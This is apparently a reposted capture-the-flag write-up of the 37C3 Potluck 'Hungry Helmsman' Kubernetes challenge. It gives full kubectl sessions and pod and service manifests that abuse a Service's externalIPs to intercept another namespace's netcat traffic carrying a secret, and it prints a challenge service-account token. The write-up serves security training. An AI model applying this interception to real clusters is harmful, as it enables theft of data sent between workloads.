# 37C3 Potluck CTF – Hungry Helmsman

> 原文: https://www.ctfiot.com/154453.html
> ID: 154453


```
rayanlecat@potluck2023 /workspace # nc challenge10.play.potluckctf.com 8888
 _ _ _ _ __
 | | | | | | | | / _|
 _ __ ___ | |_| |_ _ ___| | _____| |_| |_
| '_ \ / _ \| __| | | | |/ __| |/ / __| __| _|
| |_) | (_) | |_| | |_| | (__| < (__| |_| |
| .__/ \___/ \__|_|\__,_|\___|_|\_\___|\__|_|
| |
|_|
 
Challenge: Hungry Helmsman
Creating Cluster
Waiting for control plane..........................................
Here is your Kubeconfig:

apiVersion: v1
clusters:
- cluster:
 server: https://flux-cluster-74ca68cd8370436984e2dd80c3601e28.challenge10.play.potluckctf.com
 name: ctf-cluster
contexts:
- context:
 cluster: ctf-cluster
 user: ctf-player
 name: ctf-cluster
current-context: ctf-cluster
kind: Config
preferences: {}
users:
- name: ctf-player
 user:
 token: eyJhbGciOiJSUzI1NiIsImtpZCI6Ild6S0RQYTNfQWpsV1BtRnIyZmo1NS1SZEJST1lnM2JqYWRScF9PQWhwdjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzAzODU2NDc2LCJpYXQiOjE3MDM4NTI4NzYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0Iiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImN0Zi1wbGF5ZXIiLCJ1aWQiOiJmMjY1NTE3Yy1jZjM1LTQwNzAtYTkwOS0zYWI4NjNmNWJlMjIifX0sIm5iZiI6MTcwMzg1Mjg3Niwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6Y3RmLXBsYXllciJ9.oTSHy_oVpwSfdOrOKCpsZgQgIRk1Fa-QdCoB3KqBRiX-WtQWgcgLlKGUbT4405CnDc60A4c79lkDjwQbX3s4EUT3Zw7CZSFrpcZM1VBwAzsK1eRTRafrSoTbeYt6vp_80jNVVNyEN2HpECyxQbguMmmU65tTvGupKQq_ZWjH0Z3NhRTIXbBgTVESFxjoMQNA4NRQ1AzHHUzqisVMUgIyKtvT00sZhwDLiqf0UNTHwDX56-j5tBNFIBB4gePB4S5PPiBt1ebGpR6GQXYtnTL3SLtLJNg_f-1Qyr3Hb_htGQGf90TekbtaHzC6jDfJzXl5JR6pYAcXWdZmpl8V4V2uUw
```



```
rayanlecat@potluck2023 /workspace # # kubectl config --kubeconfig config view
apiVersion: v1
clusters:
- cluster:
 server: https://flux-cluster-74ca68cd8370436984e2dd80c3601e28.challenge10.play.potluckctf.com
 name: ctf-cluster
contexts:
- context:
 cluster: ctf-cluster
 user: ctf-player
 name: ctf-cluster
current-context: ctf-cluster2
kind: Config
preferences: {}
users:
- name: ctf-player
 user:
 token: REDACTED
```



```
rayanlecat@potluck2023 /workspace # kubectl get namespace 
NAME STATUS AGE
default Active 99s
flag-reciever Active 93s
flag-sender Active 93s
kube-node-lease Active 99s
kube-public Active 99s
kube-system Active 99s
```



```
rayanlecat@potluck2023 /workspace # kubectl get pods --namespace=flag-sender 
NAME READY STATUS RESTARTS AGE
flag-sender-676776d678-2g8vm 1/1 Running 0 8m12s

rayanlecat@potluck2023 /workspace # kubectl get pods --namespace=flag-reciever 
No resources found in flag-reciever namespace.
```



```
rayanlecat@potluck2023 /workspace # kubectl describe pods/flag-sender-676776d678-5s6t5 --namespace=flag-sender
Name: flag-sender-676776d678-5s6t5
Namespace: flag-sender
...[snip]...
 Command:
 sh
 Args:
 -c
 while true; do echo $FLAG | nc 1.1.1.1 80 || continue; echo 'Flag Send'; sleep 10; done
...[snip]...
```



```
rayanlecat@potluck2023 /workspace # kubectl auth can-i --list --namespace=flag-reciever 
Resources Non-Resource URLs Resource Names Verbs
pods.* [] [] [create delete]
services.* [] [] [create delete]
...[snip]...
```



```
rayanlecat@potluck2023 /workspace # cat pod.yml
apiVersion: v1
kind: Pod
metadata:
 name: evil-pod
 namespace: flag-reciever
spec:
 containers:
 - name: evil-container
 image: busybox

rayanlecat@potluck2023 /workspace # kubectl apply -f pod.yml --namespace=flag-reciever 
Error from server (Forbidden): error when creating "pod.yml": pods "evil-pod" is forbidden: violates PodSecurity "restricted:latest": 
allowPrivilegeEscalation != false (container "evil-container" must set securityContext.allowPrivilegeEscalation=false), 
unrestricted capabilities (container "evil-container" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "evil-container" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "evil-container" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
```



```
apiVersion: v1
kind: Pod
metadata:
 name: evil-pod
 namespace: flag-reciever
spec:
 containers:
 - name: evil-container
 image: busybox
 securityContext:
 allowPrivilegeEscalation: false
 runAsNonRoot: true
 runAsUser: 1000 
 capabilities:
 drop:
 - ALL
 seccompProfile:
 type: RuntimeDefault
```



```
rayanlecat@potluck2023 /workspace # kubectl apply -f pod.yml --namespace=flag-reciever
Error from server (Forbidden): error when creating "pod.yml": pods "evil-pod" is forbidden: failed quota: flag-reciever: must specify limits.cpu for: evil-container; limits.memory for: evil-container; requests.cpu for: evil-container; requests.memory for: evil-container
```



```
rayanlecat@potluck2023 /workspace # kubectl describe quota --namespace=flag-reciever 
Name: flag-reciever
Namespace: flag-reciever
Resource Used Hard
-------- ---- ----
limits.cpu 0 200m
limits.memory 0 100M
requests.cpu 0 100m
requests.memory 0 50M
```



```
apiVersion: v1
kind: Pod
metadata:
 name: evil-pod
 namespace: flag-reciever
spec:
 containers:
 - name: evil-container
 image: busybox
 resources:
 requests:
 memory: "50M"
 cpu: "50m"
 limits:
 memory: "100M"
 cpu: "200m"
 securityContext:
 allowPrivilegeEscalation: false
 runAsNonRoot: true
 runAsUser: 1000 
 capabilities:
 drop:
 - ALL
 seccompProfile:
 type: RuntimeDefault

rayanlecat@potluck2023 /workspace # kubectl apply -f pod.yml --namespace=flag-reciever
pod/evil-pod created
```



```
rayanlecat@potluck2023 /workspace # kubectl get networkpolicies --namespace=flag-reciever 
NAME POD-SELECTOR AGE
flag-reciever <none> 17m

rayanlecat@potluck2023 /workspace # kubectl describe networkpolicies --namespace flag-reciever
Name: flag-reciever
Namespace: flag-reciever
Created on: 2023-12-29 15:50:55 +0100 CET
Labels: <none>
Annotations: <none>
Spec:
 PodSelector: <none> (Allowing the specific traffic to all pods in this namespace)
 Allowing ingress traffic:
 To Port: <any> (traffic allowed to all ports)
 From:
 NamespaceSelector: ns=flag-sender
 PodSelector: app=flag-sender
 Allowing egress traffic:
 <none> (Selected pods are isolated for egress connectivity)
 Policy Types: Ingress, Egress
```



```
rayanlecat@potluck2023 /workspace # cat pod.yml
apiVersion: v1
kind: Pod
metadata:
 name: evil-pod
 namespace: flag-reciever
spec:
 containers:
 - name: evil-container
 image: busybox
 ports:
 - containerPort: 80
 args: ["sh", "-c", "while true; do nc -l -v -p 80; done"]
 resources:
 requests:
 memory: "50M"
 cpu: "50m"
 limits:
 memory: "100M"
 cpu: "200m"
 securityContext:
 allowPrivilegeEscalation: false
 runAsNonRoot: true
 runAsUser: 1000 
 capabilities:
 drop:
 - ALL
 seccompProfile:
 type: RuntimeDefault

rayanlecat@potluck2023 /workspace # kubectl apply -f pod.yml --namespace=flag-reciever
pod/evil-pod created

rayanlecat@potluck2023 /workspace # kubectl logs -f evil-pod --namespace=flag-reciever
nc: bind: Permission denied
```



```
rayanlecat@potluck2023 /workspace # cat pod.yml
apiVersion: v1
kind: Pod
metadata:
 name: evil-pod
 namespace: flag-reciever
spec:
 containers:
 - name: evil-container
 image: busybox
 ports:
 - containerPort: 1337
 args: ["sh", "-c", "while true; do nc -l -v -p 1337; done"]
 resources:
 requests:
 memory: "50M"
 cpu: "50m"
 limits:
 memory: "100M"
 cpu: "200m"
 securityContext:
 allowPrivilegeEscalation: false
 runAsNonRoot: true
 runAsUser: 1000 
 capabilities:
 drop:
 - ALL
 seccompProfile:
 type: RuntimeDefault

rayanlecat@potluck2023 /workspace # kubectl apply -f pod.yml --namespace=flag-reciever
pod/evil-pod created

rayanlecat@potluck2023 /workspace # kubectl logs -f evil-pod --namespace=flag-reciever
listening on [::]:1337 ...
```



```
rayanlecat@potluck2023 /workspace # cat service.yml
apiVersion: v1
kind: Service
metadata:
 name: evil-service
 namespace: flag-reciever
spec:
 selector:
 app: evil-receiver
 ports:
 - protocol: TCP
 port: 80
 targetPort: 1337
 externalIPs:
 - 1.1.1.1

rayanlecat@potluck2023 /workspace # cat pod.yml
apiVersion: v1
kind: Pod
metadata:
 name: evil-pod
 namespace: flag-reciever
 labels:
 app: evil-receiver
spec:
 containers:
 - name: evil-container
 image: busybox
 ports:
 - containerPort: 1337
 args: ["sh", "-c", "while true; do nc -l -v -p 1337; done"]
 resources:
 requests:
 memory: "50M"
 cpu: "50m"
 limits:
 memory: "100M"
 cpu: "200m"
 securityContext:
 allowPrivilegeEscalation: false
 runAsNonRoot: true
 runAsUser: 1000 
 capabilities:
 drop:
 - ALL
 seccompProfile:
 type: RuntimeDefault

rayanlecat@potluck2023 /workspace # kubectl apply -f pod.yml --namespace=flag-reciever
pod/evil-pod created

rayanlecat@potluck2023 /workspace # kubectl apply -f service.yml --namespace=flag-reciever
service/evil-service created
```



```
rayanlecat@potluck2023 /workspace # kubectl logs -f evil-pod --namespace=flag-reciever 
listening on [::]:1337 ...
connect to [::ffff:192.168.20.6]:1337 from (null) ([::ffff:192.168.20.0]:7004)
potluck{kubernetes_can_be_a_bit_weird}
```
